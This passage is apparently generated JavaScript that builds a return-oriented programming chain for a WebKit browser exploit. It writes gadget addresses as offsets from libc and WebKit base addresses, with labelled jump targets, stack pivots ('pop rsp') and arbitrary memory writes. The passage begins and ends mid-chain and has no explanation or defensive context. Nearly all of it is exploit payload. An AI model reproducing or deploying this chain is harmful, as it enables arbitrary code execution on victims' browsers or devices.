db([4294967028,4294967295]);// -0x10c
set_gadget(libc_base+772328,);
//L4886:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+278088,//L4888
webkit_base+4687784,
libc_base+772328
]);
//L4887:
db([0,0]);
set_gadget(libc_base+768796,);
//L4888:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+278144,//L4891
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4891:
db([0,0]);
//L4889:
set_gadgets([
libc_base+713278,
ropchain+278208,//L4894
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4892:
db([4294967028,4294967295]);// -0x10c
set_gadget(libc_base+772328,);
//L4894:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+278296,//L4896
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+278312,//L4897
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4896:
db([0,0]);
set_gadget(libc_base+772328,);
//L4897:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+278472,//L4899
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+278504,//L4901
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+278456,//L4898
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+278488,//L4900
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4898:
db([0,0]);
set_gadget(libc_base+165442,);
//L4899:
db([0,0]);
set_gadget(libc_base+772328,);
//L4900:
db([0,0]);
set_gadget(libc_base+768796,);
//L4901:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+278584,//L4902
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+278600,//L4903
webkit_base+4687784,
libc_base+165442
]);
//L4902:
db([0,0]);
set_gadget(libc_base+768796,);
//L4903:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+278696,//L4905
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+278680,//L4904
webkit_base+4687784,
libc_base+165442
]);
//L4904:
db([0,0]);
set_gadget(libc_base+768796,);
//L4905:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+278792,//L4907
webkit_base+4687784,
libc_base+768796
]);
//L4906:
db([32,0]);// 0x20
set_gadget(webkit_base+3789839,);//pop r11
//L4907:
db([0,0]);
set_gadget(libc_base+165442,);
//L4908:
db([32,0]);// 0x20
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+278936,//L4910
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+278952,//L4911
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+278920,//L4909
webkit_base+4687784,
libc_base+165442
]);
//L4909:
db([0,0]);
set_gadget(libc_base+772328,);
//L4910:
db([0,0]);
set_gadget(libc_base+768796,);
//L4911:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+279128,//L4913
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+279144,//L4914
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+279112,//L4912
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4912:
db([0,0]);
set_gadget(libc_base+165442,);
//L4913:
db([0,0]);
set_gadget(libc_base+768796,);
//L4914:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+279272,//L4917
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+279304,//L4919
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+279288,//L4918
webkit_base+4687784,
libc_base+713278
]);
//L4916:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L4917:
db([0,0]);
set_gadget(libc_base+165442,);
//L4918:
db([0,0]);
set_gadget(libc_base+768796,);
//L4919:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+279416,//L4920+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+279408,//L4920
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L4920:
db([0,0]);
set_gadgets([
ropchain+279432,//L4920+24
ropchain+279448,//L4915
libc_base+489696,//pop rsp
ropchain+279464,//L4921
//L4915:
libc_base+489696,//pop rsp
ropchain+287128,//L4922
//L4921:
libc_base+713278,
ropchain+279520,//L4925
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4923:
db([40,0]);// 0x28
set_gadget(libc_base+772328,);
//L4925:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+279608,//L4927
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+279624,//L4928
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4927:
db([0,0]);
set_gadget(libc_base+772328,);
//L4928:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+279768,//L4931
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+279736,//L4929
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+279752,//L4930
webkit_base+4687784,
libc_base+165442
]);
//L4929:
db([0,0]);
set_gadget(libc_base+772328,);
//L4930:
db([0,0]);
set_gadget(libc_base+768796,);
//L4931:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+279864,//L4933
webkit_base+4687784,
libc_base+713278
]);
//L4932:
db([4294967040,4294967295]);// -0x100
set_gadget(libc_base+768796,);
//L4933:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+279944,//L4935
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4935:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+280000,//L4937
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4937:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
//L4938:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L4939:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4940:
db([0,0]);
set_gadget(libc_base+772328,);
//L4941:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+280248,//L4942
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+280264,//L4943
webkit_base+4687784,
libc_base+772328
]);
//L4942:
db([0,0]);
set_gadget(libc_base+768796,);
//L4943:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+280352,//L4945
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4945:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+280408,//L4947
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4947:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+280480,//L4949
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4949:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+280536,//L4951
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4951:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+280640,//L4954
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4952:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L4954:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+280728,//L4956
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+280744,//L4957
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4956:
db([0,0]);
set_gadget(libc_base+772328,);
//L4957:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+280904,//L4959
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+280936,//L4961
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+280888,//L4958
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+280920,//L4960
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4958:
db([0,0]);
set_gadget(libc_base+165442,);
//L4959:
db([0,0]);
set_gadget(libc_base+772328,);
//L4960:
db([0,0]);
set_gadget(libc_base+768796,);
//L4961:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+281032,//L4963
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+281016,//L4962
webkit_base+4687784,
libc_base+165442
]);
//L4962:
db([0,0]);
set_gadget(libc_base+768796,);
//L4963:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+281128,//L4966
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4964:
db([4294967028,4294967295]);// -0x10c
set_gadget(libc_base+772328,);
//L4966:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+281216,//L4968
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+281232,//L4969
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4968:
db([0,0]);
set_gadget(libc_base+772328,);
//L4969:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+281392,//L4971
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+281424,//L4973
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+281376,//L4970
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+281408,//L4972
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4970:
db([0,0]);
set_gadget(libc_base+165442,);
//L4971:
db([0,0]);
set_gadget(libc_base+772328,);
//L4972:
db([0,0]);
set_gadget(libc_base+768796,);
//L4973:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+281528,//L4976
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+281512,//L4975
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4975:
db([0,0]);
set_gadget(libc_base+772328,);
//L4976:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+281584,//L4978
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4978:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278,
ropchain+281736,//L4980
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+281752,//L4981
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+281720,//L4979
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4979:
db([0,0]);
set_gadget(libc_base+165442,);
//L4980:
db([0,0]);
set_gadget(libc_base+768796,);
//L4981:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+281848,//L4983
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+281832,//L4982
webkit_base+4687784,
libc_base+165442
]);
//L4982:
db([0,0]);
set_gadget(libc_base+768796,);
//L4983:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+281944,//L4985
webkit_base+4687784,
libc_base+713278
]);
//L4984:
db([4294967040,4294967295]);// -0x100
set_gadget(libc_base+768796,);
//L4985:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+282024,//L4987
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4987:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+282080,//L4989
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4989:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
//L4990:
db([176,0]);// 0xb0
set_gadget(libc_base+768796,);
//L4991:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4992:
db([0,0]);
set_gadget(libc_base+772328,);
//L4993:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+282328,//L4994
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+282344,//L4995
webkit_base+4687784,
libc_base+772328
]);
//L4994:
db([0,0]);
set_gadget(libc_base+768796,);
//L4995:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+282432,//L4997
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4997:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+282488,//L4999
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4999:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+282560,//L5001
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5001:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+282616,//L5003
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5003:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+282720,//L5006
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5004:
db([4294967036,4294967295]);// -0x104
set_gadget(libc_base+772328,);
//L5006:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+282808,//L5008
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+282824,//L5009
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5008:
db([0,0]);
set_gadget(libc_base+772328,);
//L5009:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+282984,//L5011
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+283016,//L5013
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+282968,//L5010
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+283000,//L5012
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5010:
db([0,0]);
set_gadget(libc_base+165442,);
//L5011:
db([0,0]);
set_gadget(libc_base+772328,);
//L5012:
db([0,0]);
set_gadget(libc_base+768796,);
//L5013:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+283112,//L5015
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+283096,//L5014
webkit_base+4687784,
libc_base+165442
]);
//L5014:
db([0,0]);
set_gadget(libc_base+768796,);
//L5015:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+283208,//L5017
webkit_base+4687784,
libc_base+713278
]);
//L5016:
db([4294967040,4294967295]);// -0x100
set_gadget(libc_base+768796,);
//L5017:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5018:
db([51,0]);// 0x33
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5019:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+283408,//L5022
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5020:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5022:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+283496,//L5024
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+283512,//L5025
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5024:
db([0,0]);
set_gadget(libc_base+772328,);
//L5025:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+283656,//L5028
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+283672,//L5029
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+283640,//L5027
webkit_base+4687784,
libc_base+713278
]);
//L5026:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L5027:
db([0,0]);
set_gadget(libc_base+772328,);
//L5028:
db([0,0]);
set_gadget(libc_base+768796,);
//L5029:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+283760,//L5031
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+283776,//L5032
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5031:
db([0,0]);
set_gadget(libc_base+772328,);
//L5032:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+283920,//L5035
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+283888,//L5033
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+283904,//L5034
webkit_base+4687784,
libc_base+165442
]);
//L5033:
db([0,0]);
set_gadget(libc_base+772328,);
//L5034:
db([0,0]);
set_gadget(libc_base+768796,);
//L5035:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+283992,//L5037
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5037:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+284048,//L5039
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5039:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+284144,//L5042
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5040:
db([4294967028,4294967295]);// -0x10c
set_gadget(libc_base+772328,);
//L5042:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+284232,//L5044
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+284248,//L5045
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5044:
db([0,0]);
set_gadget(libc_base+772328,);
//L5045:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+284408,//L5047
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+284440,//L5049
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+284392,//L5046
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+284424,//L5048
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5046:
db([0,0]);
set_gadget(libc_base+165442,);
//L5047:
db([0,0]);
set_gadget(libc_base+772328,);
//L5048:
db([0,0]);
set_gadget(libc_base+768796,);
//L5049:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+284600,//L5053
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+284552,//L5050
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+284568,//L5051
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5050:
db([0,0]);
set_gadget(libc_base+165442,);
//L5051:
db([0,0]);
set_gadget(libc_base+772328,);
//L5052:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L5053:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+284680,//L5054
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+284696,//L5055
webkit_base+4687784,
libc_base+772328
]);
//L5054:
db([0,0]);
set_gadget(libc_base+768796,);
//L5055:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+284784,//L5057
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5057:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+284840,//L5059
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5059:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+284968,//L5060
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+285000,//L5062
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+284984,//L5061
webkit_base+4687784,
libc_base+165442
]);
//L5060:
db([0,0]);
set_gadget(libc_base+772328,);
//L5061:
db([0,0]);
set_gadget(libc_base+768796,);
//L5062:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+285160,//L5064
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+285192,//L5066
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+285144,//L5063
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+285176,//L5065
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5063:
db([0,0]);
set_gadget(libc_base+165442,);
//L5064:
db([0,0]);
set_gadget(libc_base+772328,);
//L5065:
db([0,0]);
set_gadget(libc_base+768796,);
//L5066:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+285272,//L5067
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+285288,//L5068
webkit_base+4687784,
libc_base+165442
]);
//L5067:
db([0,0]);
set_gadget(libc_base+768796,);
//L5068:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+285384,//L5070
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+285368,//L5069
webkit_base+4687784,
libc_base+165442
]);
//L5069:
db([0,0]);
set_gadget(libc_base+768796,);
//L5070:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5072:
ropchain+285488,//L5071
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+297248,//L4355
//L5071:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+285632,//L5074
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+285648,//L5075
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+285616,//L5073
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5073:
db([0,0]);
set_gadget(libc_base+165442,);
//L5074:
db([0,0]);
set_gadget(libc_base+768796,);
//L5075:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+285776,//L5078
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+285808,//L5080
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+285792,//L5079
webkit_base+4687784,
libc_base+713278
]);
//L5077:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5078:
db([0,0]);
set_gadget(libc_base+165442,);
//L5079:
db([0,0]);
set_gadget(libc_base+768796,);
//L5080:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+285920,//L5081+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+285912,//L5081
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5081:
db([0,0]);
set_gadgets([
ropchain+285936,//L5081+24
ropchain+286400,//L5076
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+286008,//L5084
webkit_base+4687784,
libc_base+768796
]);
//L5082:
db([0,0]);
set_gadget(libc_base+165442,);
//L5083:
db([0,0]);
set_gadget(libc_base+772328,);
//L5084:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+286168,//L5086
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+286200,//L5088
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+286152,//L5085
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+286184,//L5087
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5085:
db([0,0]);
set_gadget(libc_base+165442,);
//L5086:
db([0,0]);
set_gadget(libc_base+772328,);
//L5087:
db([0,0]);
set_gadget(libc_base+768796,);
//L5088:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+286280,//L5089
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+286296,//L5090
webkit_base+4687784,
libc_base+165442
]);
//L5089:
db([0,0]);
set_gadget(libc_base+768796,);
//L5090:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+286392,//L5092
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+286376,//L5091
webkit_base+4687784,
libc_base+165442
]);
//L5091:
db([0,0]);
set_gadget(libc_base+768796,);
//L5092:
db([0,0]);
//L5076:
//L5093:
set_gadgets([
libc_base+713278,
ropchain+286456,//L5096
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
